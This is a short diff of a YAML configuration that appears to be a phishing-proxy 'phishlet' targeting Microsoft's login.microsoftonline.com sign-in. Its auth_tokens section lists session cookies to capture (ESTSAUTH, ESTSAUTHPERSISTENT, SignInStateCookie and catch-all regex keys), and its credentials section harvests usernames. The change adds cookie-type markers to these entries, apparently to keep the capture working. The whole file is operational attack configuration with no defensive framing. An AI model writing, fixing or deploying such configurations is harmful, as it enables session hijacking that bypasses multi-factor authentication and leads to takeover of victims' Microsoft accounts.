@@ -17,12 +17,16 @@ sub_filters:
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', '.*,regexp']
+    type: 'cookie'
   - domain: 'login.microsoftonline.com'
     keys: ['SignInStateCookie', '.*,regexp']
+    type: 'cookie'
+  - domain: 'login.microsoftonline.com'
+    keys: ['.*,regexp']
+    type: 'cookie'    
   - domain: 'login.microsoftonline.com'
     keys: ['.*,regexp']    
-  - domain: 'login.microsoftonline.com'
-    keys: ['.*,regexp']      
+    type: 'cookie'  
 credentials:
   username:
     key: '(login|UserName)'
